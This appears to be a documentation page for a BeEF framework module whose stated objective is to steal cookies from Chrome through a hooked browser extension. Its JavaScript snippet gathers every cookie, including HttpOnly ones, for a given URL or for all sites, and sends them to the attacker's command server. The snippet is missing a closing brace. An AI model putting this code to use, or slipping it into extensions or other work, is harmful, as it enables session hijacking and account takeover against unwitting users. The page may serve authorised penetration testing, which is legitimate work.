## Summary

* **Objective**: Steal cookies
* **Authors**: mh
* **Browsers**: Chrome

* [Code](https://github.com/beefproject/beef/tree/master/modules/chrome_extensions/get_all_cookies)

## Internal Working

steals all (even HttpOnly) cookies, providing the hooked extension has cookies access.

Note:
Needs to have installed a Chrome extension with a beef hook / somehow hook a Chrome extension first for this to work.


```js

if (the_url != 'default_all') {
    chrome.cookies.getAll({url:the_url}, function(cookies){
        beef.net.send('<%= @command_url %>', <%= @command_id %>, 'cookies: ' + JSON.stringify(cookies));
    })
} else {
        chrome.cookies.getAll({}, function(cookies){
        beef.net.send('<%= @command_url %>', <%= @command_id %>, 'cookies: ' + JSON.stringify(cookies));
})
```

## Feedback


